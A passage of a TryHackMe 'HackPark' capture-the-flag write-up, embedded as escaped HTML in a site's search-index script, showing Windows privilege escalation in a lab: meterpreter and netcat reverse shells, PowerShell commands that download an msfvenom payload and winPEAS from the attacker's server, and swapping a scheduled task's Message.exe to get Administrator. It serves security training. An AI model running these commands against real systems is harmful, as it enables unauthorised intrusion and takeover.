machine\u003c/p\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003eshell.exe\n\u003c/code\u003e\u003c/pre\u003e\n\u003cimg class="img-simple img-fluid lazyload blur-up" src="/docs/tryhackme/hackpark/thm_t4_multi_handler_get_session_huea2f5d1c3823fe1f6f89f805f863c323_8214_20x0_resize_box_2.png" data-src="/docs/tryhackme/hackpark/thm_t4_multi_handler_get_session.png" width="848" height="104" alt="Incoming connection from target"\u003e\n\u003ch3 id="whats-the-os-version"\u003eWhat\u0026rsquo;s the OS version?\u003c/h3\u003e\n\u003cp\u003eAs soon as you are connected with the new meterpreter shell, run \u003ccode\u003esysinfo\u003c/code\u003e to get the OS version.\n\u003cimg class="img-simple img-fluid lazyload blur-up" src="/docs/tryhackme/hackpark/thm_t4_os_version_hu46a5f1e6e37711461c5dc51c8d885ebc_15656_20x0_resize_box_2.png" data-src="/docs/tryhackme/hackpark/thm_t4_os_version.png" width="417" height="153" alt="Printed sysinfo"\u003e\u003c/p\u003e\n\u003ch3 id="winpeasbrenumeration"\u003eWinPEAS:\u003cbr\u003eEnumeration\u003c/h3\u003e\n\u003cdiv class="alert alert-warning d-flex" role="alert"\u003e\n  \u003cdiv class="flex-shrink-1 alert-icon"\u003e💡\u003c/div\u003e\n  \u003cdiv class="w-100"\u003eInstead of windows-exploit-suggester I used winPEAS\u003c/div\u003e\n\u003c/div\u003e\n\u003cp\u003eIf you do not have WinPEAS already stored on your machine, you can do this now. A quick search on google will give you all the information you need.\u003c/p\u003e\n\u003cp\u003eUse the same method as used in the last step to get winPEAS.bat transferred to the target machine.\u003c/p\u003e\n\u003cimg class="img-simple img-fluid lazyload blur-up" src="/docs/tryhackme/hackpark/thm_t4_upload_winPEAS_1_hu57702decde20fcd868586fdee2709831_7874_20x0_resize_box_2.png" data-src="/docs/tryhackme/hackpark/thm_t4_upload_winPEAS_1.png" width="440" height="150" alt="Switch to meterpreter shell"\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003epowershell \u0026quot;(New-Object System.Net.WebClient).Downloadfile(\'http://\u0026lt;webserver ip\u0026gt;:8000/winPEAS.bat\',\'winPEAS.bat\')\u0026quot;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cimg class="img-simple img-fluid lazyload blur-up" src="/docs/tryhackme/hackpark/thm_t4_upload_winPEAS_2_hu496d72db57f7230794731c125518c84a_46960_20x0_resize_box_2.png" data-src="/docs/tryhackme/hackpark/thm_t4_upload_winPEAS_2.png" width="895" height="536" alt="List of files in temp folder"\u003e\n\u003cp\u003eRun \u003ccode\u003ewinPEAS.bat\u003c/code\u003e\u003c/p\u003e\n\u003ch3 id="any-suspicious-service-running"\u003eAny suspicious service running?\u003c/h3\u003e\n\u003cp\u003eHave a look at the output of winPEAS (\u003ccode\u003eRUNNING PROCESSES\u003c/code\u003e is what we are searching for)\u003c/p\u003e\n\u003cdiv class="alert alert-warning d-flex" role="alert"\u003e\n  \u003cdiv class="flex-shrink-1 alert-icon"\u003e💡\u003c/div\u003e\n  \u003cdiv class="w-100"\u003eIt\'s always worth checking for WindowsScheduler or CronTabs on Linux\u003c/div\u003e\n\u003c/div\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003e_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-\u0026gt; [+] RUNNING PROCESSES \u0026lt;_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-\n[i] Something unexpected is running? Check for vulnerabilities\n [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#running-processes\n\nImage Name                     PID Services\n========================= ======== ============================================\nSystem Idle Process              0 N/A\nSystem                           4 N/A\nsmss.exe                       376 N/A\ncsrss.exe                      524 N/A\ncsrss.exe                      580 N/A\nwininit.exe                    588 N/A\nwinlogon.exe                   616 N/A\nservices.exe                   680 N/A\nlsass.exe                      688 SamSs\nsvchost.exe                    748 BrokerInfrastructure, DcomLaunch, LSM,\n                                   PlugPlay, Power, SystemEventsBroker\nsvchost.exe                    792 RpcEptMapper, RpcSs\ndwm.exe                        872 N/A\nsvchost.exe                    888 Dhcp, EventLog, lmhosts, Wcmsvc\nsvchost.exe                    916 AeLookupSvc, CertPropSvc, DsmSvc, gpsvc,\n                                   iphlpsvc, LanmanServer, ProfSvc, Schedule,\n                                   SENS, SessionEnv, ShellHWDetection, Themes,\n                                   Winmgmt\nsvchost.exe                    972 EventSystem, FontCache, netprofm, nsi,\n                                   W32Time, WinHttpAutoProxySvc\nsvchost.exe                    360 CryptSvc, Dnscache, LanmanWorkstation,\n                                   NlaSvc, WinRM\nsvchost.exe                    848 BFE, DPS, MpsSvc\nspoolsv.exe                   1148 Spooler\namazon-ssm-agent.exe          1180 AmazonSSMAgent\nsvchost.exe                   1256 AppHostSvc\nLiteAgent.exe                 1276 AWSLiteAgent\nsvchost.exe                   1372 TrkWks, UALSVC, UmRdpService\nsvchost.exe                   1388 W3SVC, WAS\nWService.exe                  1416 WindowsScheduler\nWScheduler.exe                1556 N/A\nEc2Config.exe                 1656 Ec2Config\nWmiPrvSE.exe                  1748 N/A\nsvchost.exe                   1432 TermService\ntaskhostex.exe                2584 N/A\nexplorer.exe                  2656 N/A\nServerManager.exe             2360 N/A\nWScheduler.exe                1804 N/A\nmsdtc.exe                     1888 MSDTC\nw3wp.exe                      2520 N/A\ncmd.exe                       1564 N/A\nconhost.exe                   2116 N/A\nshell.exe                     1860 N/A\ncmd.exe                       2132 N/A\nconhost.exe                    924 N/A\nWmiPrvSE.exe                  1864 N/A\nTrustedInstaller.exe          1948 TrustedInstaller\nTiWorker.exe                  1356 N/A\ntasklist.exe                  2668 N/A\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eHead over to the \u003ccode\u003eSystemScheduler\u003c/code\u003e folder.\u003c/p\u003e\n\u003cdiv class="alert alert-warning d-flex" role="alert"\u003e\n  \u003cdiv class="flex-shrink-1 alert-icon"\u003e💡\u003c/div\u003e\n  \u003cdiv class="w-100"\u003eI sent the current channel to background with `ctrl + z`\u003c/div\u003e\n\u003c/div\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003ecd \u0026quot;c:\\Program Files (x86)\\SystemScheduler\u0026quot;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eCheck out the read, write, execute permissions! That looks great!\u003c/p\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003emeterpreter \u0026gt; ls\nListing: c:\\Program Files (x86)\\SystemScheduler\n===============================================\n\nMode              Size     Type  Last modified              Name\n----              ----     ----  -------------              ----\n40777/rwxrwxrwx   4096     dir   2019-08-04 11:36:53 +0000  Events\n100666/rw-rw-rw-  60       fil   2019-08-04 11:36:42 +0000  Forum.url\n100666/rw-rw-rw-  9813     fil   2019-08-04 11:36:42 +0000  License.txt\n100666/rw-rw-rw-  1496     fil   2019-08-04 11:37:02 +0000  LogFile.txt\n100666/rw-rw-rw-  3760     fil   2019-08-04 11:36:53 +0000  LogfileAdvanced.txt\n100777/rwxrwxrwx  536992   fil   2019-08-04 11:36:42 +0000  Message.exe\n100777/rwxrwxrwx  445344   fil   2019-08-04 11:36:42 +0000  PlaySound.exe\n100777/rwxrwxrwx  27040    fil   2019-08-04 11:36:42 +0000  PlayWAV.exe\n100666/rw-rw-rw-  149      fil   2019-08-04 11:36:53 +0000  Preferences.ini\n100777/rwxrwxrwx  485792   fil   2019-08-04 11:36:42 +0000  Privilege.exe\n100666/rw-rw-rw-  10100    fil   2019-08-04 11:36:42 +0000  ReadMe.txt\n100777/rwxrwxrwx  112544   fil   2019-08-04 11:36:42 +0000  RunNow.exe\n100777/rwxrwxrwx  235936   fil   2019-08-04 11:36:42 +0000  SSAdmin.exe\n100777/rwxrwxrwx  731552   fil   2019-08-04 11:36:42 +0000  SSCmd.exe\n100777/rwxrwxrwx  456608   fil   2019-08-04 11:36:42 +0000  SSMail.exe\n100777/rwxrwxrwx  1633696  fil   2019-08-04 11:36:42 +0000  Scheduler.exe\n100777/rwxrwxrwx  491936   fil   2019-08-04 11:36:42 +0000  SendKeysHelper.exe\n100777/rwxrwxrwx  437664   fil   2019-08-04 11:36:42 +0000  ShowXY.exe\n100777/rwxrwxrwx  439712   fil   2019-08-04 11:36:42 +0000  ShutdownGUI.exe\n100666/rw-rw-rw-  785042   fil   2019-08-04 11:36:42 +0000  WSCHEDULER.CHM\n100666/rw-rw-rw-  703081   fil   2019-08-04 11:36:42 +0000  WSCHEDULER.HLP\n100777/rwxrwxrwx  136096   fil   2019-08-04 11:36:42 +0000  WSCtrl.exe\n100777/rwxrwxrwx  68512    fil   2019-08-04 11:36:42 +0000  WSLogon.exe\n100666/rw-rw-rw-  33184    fil   2019-08-04 11:36:42 +0000  WSProc.dll\n100666/rw-rw-rw-  2026     fil   2019-08-04 11:36:42 +0000  WScheduler.cnt\n100777/rwxrwxrwx  331168   fil   2019-08-04 11:36:42 +0000  WScheduler.exe\n100777/rwxrwxrwx  98720    fil   2019-08-04 11:36:42 +0000  WService.exe\n100666/rw-rw-rw-  54       fil   2019-08-04 11:36:42 +0000  Website.url\n100777/rwxrwxrwx  76704    fil   2019-08-04 11:36:42 +0000  WhoAmI.exe\n100666/rw-rw-rw-  1150     fil   2019-08-04 11:36:42 +0000  alarmclock.ico\n100666/rw-rw-rw-  766      fil   2019-08-04 11:36:42 +0000  clock.ico\n100666/rw-rw-rw-  80856    fil   2019-08-04 11:36:42 +0000  ding.wav\n100666/rw-rw-rw-  1637972  fil   2019-08-04 11:36:42 +0000  libeay32.dll\n100777/rwxrwxrwx  40352    fil   2019-08-04 11:36:42 +0000  sc32.exe\n100666/rw-rw-rw-  766      fil   2019-08-04 11:36:42 +0000  schedule.ico\n100666/rw-rw-rw-  355446   fil   2019-08-04 11:36:42 +0000  ssleay32.dll\n100666/rw-rw-rw-  6999     fil   2019-08-04 11:36:42 +0000  unins000.dat\n100777/rwxrwxrwx  722597   fil   2019-08-04 11:36:42 +0000  unins000.exe\n100666/rw-rw-rw-  6574     fil   2019-08-04 11:36:42 +0000  whiteclock.ico\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eLet\u0026rsquo;s dig deeper into \u003ccode\u003eEvents\u003c/code\u003e folder and check some logfiles.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003emeterpreter \u0026gt; cd Events\nmeterpreter \u0026gt; ls\nListing: c:\\Program Files (x86)\\SystemScheduler\\Events\n======================================================\n\nMode              Size   Type  Last modified              Name\n----              ----   ----  -------------              ----\n100666/rw-rw-rw-  1926   fil   2019-08-04 22:05:19 +0000  20198415519.INI\n100666/rw-rw-rw-  27140  fil   2019-08-04 22:06:01 +0000  20198415519.INI_LOG.txt\n100666/rw-rw-rw-  290    fil   2020-10-02 21:50:12 +0000  2020102145012.INI\n100666/rw-rw-rw-  186    fil   2021-04-18 10:02:05 +0000  Administrator.flg\n100666/rw-rw-rw-  182    fil   2021-04-18 10:01:36 +0000  SYSTEM_svc.flg\n100666/rw-rw-rw-  0      fil   2021-04-18 10:02:05 +0000  Scheduler.flg\n100666/rw-rw-rw-  449    fil   2019-08-04 11:36:53 +0000  SessionInfo.flg\n100666/rw-rw-rw-  0      fil   2021-04-18 10:01:36 +0000  service.flg\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWhile you check the log files you will find this:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003emeterpreter \u0026gt; cat 20198415519.INI_LOG.txt\n...\n04/18/21 04:13:34,Process Ended. PID:2376,ExitCode:4,Message.exe (Administrator)\n04/18/21 04:14:01,Event Started Ok, (Administrator)\n04/18/21 04:14:34,Process Ended. PID:2880,ExitCode:4,Message.exe (Administrator)\n04/18/21 04:15:01,Event Started Ok, (Administrator)\n04/18/21 04:15:33,Process Ended. PID:2604,ExitCode:4,Message.exe (Administrator)\n04/18/21 04:16:01,Event Started Ok, (Administrator)\n04/18/21 04:16:33,Process Ended. PID:2556,ExitCode:4,Message.exe (Administrator)\n04/18/21 04:17:00,Event Started Ok, (Administrator)\n04/18/21 04:17:34,Process Ended. PID:2400,ExitCode:4,Message.exe (Administrator)\n04/18/21 04:18:01,Event Started Ok, (Administrator)\n04/18/21 04:18:34,Process Ended. PID:2956,ExitCode:4,Message.exe (Administrator)\n04/18/21 04:19:01,Event Started Ok, (Administrator)\nmeterpreter \u0026gt;\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThere is a service running every 30 seconds. Check the user. Great! Let\u0026rsquo;s get root now.\u003c/p\u003e\n\u003c!-- -\u003e Message.exe by Administrator --\u003e\n\u003ch3 id="root-the-machine"\u003eRoot the machine\u003c/h3\u003e\n\u003cp\u003eReplace Message.exe by our renamed shell.exe\nUse the python webserver setup earlier to download the shell into SystemScheduler folder.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003emeterpreter \u0026gt; shell\nProcess 2628 created.\nChannel 8 created.\nMicrosoft Windows [Version 6.3.9600]\n(c) 2013 Microsoft Corporation. All rights reserved.\nc:\\Program Files (x86)\\SystemScheduler\u0026gt;powershell -c \u0026quot;Invoke-WebRequest -Uri \'http://\u0026lt;webserver ip\u0026gt;:8000/shell.exe\' -OutFile \'c:\\Program Files (x86)\\SystemScheduler\\shell.exe\'\u0026quot;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIn Metasploit:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eBackground the current channel\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003ec:\\Program Files (x86)\\SystemScheduler\u0026gt;^Z\nBackground channel 8? [y/N]  y\nmeterpreter \u0026gt; pwd\nc:\\Program Files (x86)\\SystemScheduler\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003eRename Message.exe to Message.exe.bak\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003emeterpreter \u0026gt; mv Message.exe Message.exe.bak\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003eRename shell.exe to Message.exe\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003emeterpreter \u0026gt; mv shell.exe Message.exe\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003eBackground the current session \u003ccode\u003ectrl + z\u003c/code\u003e\nand run the previous \u003ccode\u003emulti/handler\u003c/code\u003e again\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003emeterpreter \u0026gt;\nBackground session 1? [y/N]  y\n[-] Unknown command: y.\nmsf5 exploit(multi/handler) \u0026gt; run\n\n[*] Started reverse TCP handler on 10.10.219.52:9001\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWithin 30 seconds WindowsScheduler will run \u003ccode\u003eMessage.exe\u003c/code\u003e that was replaced by our venomous \u003ccode\u003eshell.exe\u003c/code\u003e.\nAs the task is executed as \u003ccode\u003eAdministrator\u003c/code\u003e a reverse shell with corresponding permissions will be established.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003e[*] Sending stage (176195 bytes) to 10.10.75.91\n[*] Meterpreter session 2 opened (10.10.219.52:9001 -\u0026gt; 10.10.75.91:49304) at 2021-04-18 11:30:01 +0000\n\nmeterpreter \u0026gt; getuid\nServer username: HACKPARK\\Administrator\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eCongrats! You have root.\u003c/p\u003e\n\u003ch2 id="task-5-wo-metasploit"\u003eTask 5 (w/o Metasploit)\u003c/h2\u003e\n\u003cp\u003eUse same exploit to gain initial reverse shell. Setup a netcat listener \u003ccode\u003enc -lvnp 4445\u003c/code\u003e.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003eroot@kali:~/Desktop/HackPark# nc -lvnp 4445\nlistening on [any] 4445 ...\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eUse the browser to establish the initial reverse shell. \u003cbr\u003e\u003ccode\u003ehttp://\u0026lt;target ip\u0026gt;/admin/app/editor/editpost.cshtml\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003elistening on [any] 4445 ...\nconnect to [10.10.219.52] from (UNKNOWN) [10.10.75.91] 49313\nMicrosoft Windows [Version 6.3.9600]\n(c) 2013 Microsoft Corporation. All rights reserved.\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id="compromise-the-machine-1"\u003eCompromise the machine\u003c/h3\u003e\n\u003cp\u003eThe target is to root by using \u003ccode\u003ewindows/shell_reverse_tcp\u003c/code\u003e (instead of meterpreter which was used in Task 4).\nCreate a venomous \u003ccode\u003eshell.exe\u003c/code\u003e with different payload.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class="language-bash"\u003eroot@kali:~/Desktop/HackPark# msfvenom -p windows/shell_reverse_tcp -a x86 --encoder /x86/shikata_ga_nai LHOST=10.10.219.52 LPORT=9001 -f exe -o shell.exe\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] Skipping invalid encoder /x86/shikata_ga_nai\n[!] Couldn\'t find encoder to use\nNo encoder specified, outputting raw payload\nPayload size: 324 bytes\nFinal size of exe file: 73802 bytes\nSaved as: shell.exe\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eMove file to target\nA simple http.server will serve for this\u003c/p\u003e\n\u003cp\u003eOn your attacker machine:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003eroot@kali:~/Desktop/HackPark# python3 -m http.server 8000\nServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id="root-the-machine-1"\u003eRoot the machine\u003c/h3\u003e\n\u003cp\u003eSwitch to the victims machine and change current directory to \u003ccode\u003ec:\\Program Files (x86)\\SystemScheduler\u003c/code\u003e.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003ecd c:\\Program Files (x86)\\SystemScheduler\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eDownload generated \u003ccode\u003eshell.exe\u003c/code\u003e and \u003ccode\u003ewinPEAS.bat\u003c/code\u003e onto victim machine.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003epowershell -c \u0026quot;Invoke-WebRequest -Uri \'http://\u0026lt;webserver ip\u0026gt;:8000/shell.exe\' -OutFile \'shell.exe\'\u0026quot;\npowershell -c \u0026quot;Invoke-WebRequest -Uri \'http://\u0026lt;webserver ip\u0026gt;:8000/winPEAS.bat\' -OutFile \'winPEAS.bat\'\u0026quot;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eStart a netcat listener on your machine. For better stability I used \u003ccode\u003erlwrap\u003c/code\u003e around.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003eroot@kali:~/Desktop/HackPark# rlwrap nc -lvnp 9001\nlistening on [any] 9001 ...\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eRename \u003ccode\u003eMessage.exe\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003eren \u0026quot;Message.exe\u0026quot; \u0026quot;Message.exe.bak\u0026quot;\nc:\\Program Files (x86)\\SystemScheduler\u0026gt;ren \u0026quot;Message.exe\u0026quot; \u0026quot;Message.exe.bak\u0026quot;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eFinally rename the uploaded shell.exe on target machine to \u003ccode\u003eMessage.exe\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003eren \u0026quot;shell.exe\u0026quot; \u0026quot;Message.exe\u0026quot;\nc:\\Program Files (x86)\\SystemScheduler\u0026gt;ren \u0026quot;shell.exe\u0026quot; \u0026quot;Message.exe\u0026quot;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWait for WindowsScheduler to run our new \u003ccode\u003eMessage.exe\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class="language-sh"\u003eroot@kali:~# rlwrap nc -lvnp 9001\nlistening on [any] 9001 ...\nconnect to [10.10.219.52] from (UNKNOWN) [10.10.181.219] 49214\nMicrosoft Windows [Version 6.3.9600]\n(c) 2013 Microsoft Corporation. All rights reserved.\n\nC:\\PROGRA~2\\SYSTEM~1\u0026gt;echo %username%\necho %username%\nAdministrator\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eCongrats! You have root.\u003c/p\u003e\n'},{id:3,href:"/docs/",title:"WriteUps",description:"Collections of WriteUps on different challenges",content:"\u003cp\u003eCollection of WriteUps on different challenges.\u003cbr\u003e\nI hope you enjoy reading them all!\u003c/p\u003e\n"},{id:4,href:"/docs/tryhackme/",title:"Try Hack Me",description:"Write Ups on THM rooms",content:""}];b.add(c),userinput.addEventListener('input',e,!0),suggestions.addEventListener('click',f,!0);function e(){var g=this.value,e=b.search(g,5),f=suggestions.childNodes,h=0,i=e.length,c;for(suggestions.classList.remove('d-none'),e.forEach(function(b){c=document.createElement('div'),c.innerHTML='<a href><span></span><span></span></a>',a=c.querySelector('a'),t=c.querySelector('span:first-child'),d=c.querySelector('span:nth-child(2)'),a.href=b.href,t.textContent=b.title,d.textContent=b.description,suggestions.appendChild(c)});f.length>i;)suggestions.removeChild(f[h])}function f(){while(suggestions.lastChild)suggestions.removeChild(suggestions.lastChild);return!1}})()